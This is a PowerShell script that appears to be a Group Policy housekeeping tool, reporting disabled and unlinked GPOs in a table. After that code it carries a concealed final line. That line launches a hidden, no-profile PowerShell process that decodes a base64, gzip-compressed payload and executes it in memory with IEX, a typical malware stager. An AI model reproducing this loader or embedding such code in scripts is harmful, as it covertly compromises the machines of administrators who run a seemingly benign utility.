﻿$aOutput = @();
$aDisabledGpos = Get-GPO -All | Where-Object { $_.GpoStatus -eq 'AllSettingsDisabled' };
foreach ($oGpo in $aDisabledGpos) {
	$oOutput = New-Object System.Object;
	$oOutput | Add-Member -type NoteProperty -Name 'Status' -Value 'Disabled';
	$oOutput | Add-Member -type NoteProperty -Name 'Name' -Value $oGpo.DisplayName;
	$aOutput += $oOutput;
}


$aAllGpos = Get-Gpo -All;
$aUnlinkedGpos = @();
foreach ($oGpo in $aAllGpos) {
	 [xml]$oGpoReport = Get-GPOReport -Guid $oGpo.ID -ReportType xml;
	 if (!(Test-Member $oGpoReport.GPO LinksTo)) {
	 	$oOutput = New-Object System.Object;
		$oOutput | Add-Member -type NoteProperty -Name 'Status' -Value 'Unlinked';
		$oOutput | Add-Member -type NoteProperty -Name 'Name' -Value $oGpo.DisplayName;
		$aOutput += $oOutput;
	}
}
$aOutput.Count

$aOutput | Sort-Object Name | Format-Table -AutoSize
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAFvQZ1gCA71WbW/aSBD+nEr9D1aFZFslGAhtmkiVbo0xEF4CcTAQik4be20WFi+x1wTo9b/fGOyEKmmV64ezQN7dmdmdfeaZGXtx4AjKA8kzzeDe2BTPDVP6/v7dSQ+HeCkpuaBeO3vYdfXWMC/l1sGAj7w+KqknJ6CTC8nVRVf6KikTtFoZfIlpML28rMZhSAJxmBfqRKAoIst7RkmkqNI/0nBGQnJ6fT8njpC+S7m/C3XG7zFL1bZV7MyIdIoCN5G1uYMTDwvWilGhyN++yerktDQt1B5izCJFtraRIMuCy5isSj/U5MDb7Yoococ6IY+4JwpDGpyVC4Mgwh7pwm5r0iFixt1IVuEa8AuJiMNAOlwo2eEgV2QY9kLuINcNSQTqhWaw5gsCuMSM5aW/lEl6/E0cCLokIBck5CuLhGvqkKjQwIHLyA3xpkqXPGa3fquRcmwEWj0RqnmIymt+drgbM3IwldWXnh6FUoXnp3ACDD/ev3v/zsvosG6dr3mpaAej6JgOMDqZ7McEPFZ6PKJ79a9SMS914GgseLiFae42jIk6lSZJKCbTqZRbdFrdOP/rDUqZNuiyWbk2b9Q2HNYnNqfuFOzSUOU2iytvkwh+zTmDeDQgxjbAS+pktFJeCwDxGNnfuJCpdcE1RU4FxDUIIz4WCaJ5afLSrLak4slWjylzSYgcCGIEXkF81Z+dOQRJkZtBhywBqsNchmB4QGaSaacE3manJ3NQkqsMR1Fe6sWQTU5esghmxM1LKIhoKkKx4Puh/OxuJ2aCOjgS2XZT9QnI9MAqDyIRxg6EDy5/a62IQzFLsMhLDeoSfWtRPztYfhWJKmaMBj7stIZIwEqCgCUSUoTg44EAasEiorlcMbIEpX1imwz7kMZpLuxphH3iyi98zLh+IHYCR4bDkYcQY4txkZdsGgooEAm0T3T6Qy+OCsTBn2pI0qAoWeZM9K1IiJ5bLq35iITNhKEpSHtIQgFwmCFf6jginyuWCAEs5YN2TasInnEzYB1HX9ASeqSlZgf+A3rW5Ma527qaN7TQ2Mw81IyanUbP6DcalfWVZVeEVWuKVq8pOrXRfG6hxs1gLO6aqHFLi4txZbe6ojurjdzxRvu803ePRX2zm/uuNzY8zz/3rJvSJ5O2h9W+XizjtlGL20P9US9Wohp9bPTpoL+4MsX92GZ44Gn+qHSB6aYdzu0S7+yaCNVnZ87uyrPrs467HTe0i2FlgWoIVYOabeq8NdZD1NNs7Nv8seVXcdmvIt10KLnrD0y93zd1NKjPH4wLzQfbEZ7pQ7tM71ajmxnMTXChpRUrTZfs+LgPINU5wv4N6PjVsjPzQMf4iPSPXR6V8ULnSAcd8+4B/BqvzB4D+e2gzJHNuiOM2ndbU9NK414FNYp0WPdRsiX29T5G0drYGVrJdrk7/NQde5o9YueaUb1dOZ6maY8No+XclTZfrs+/tIfUXnI00DT7Q0IOYEduRsZe+Sjgv6rrHRxGM8yACFCvs2Q0eWimZbfHaWKhKMfdeEHCgDDoX9DhMlYjxriTdILjOg3N6NAippCfAxielV8dqdKTovrcJ7Kly8s78BkyJSNyoU0CX8zyxc1ZsQhlvripFOHib79rla+2ytN2+aRVHBA7PoTtD1GTVMqtvYq/7XXvd9f/C6ZpNs/g5b4R0+e130jfhHMxn2LxYv3nhf+E+J8iMcRUgIEFlYmRQ6f8LSApn44+Np5DB3zx0if56LuOxWkXvkT+BTEfe9ZxCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

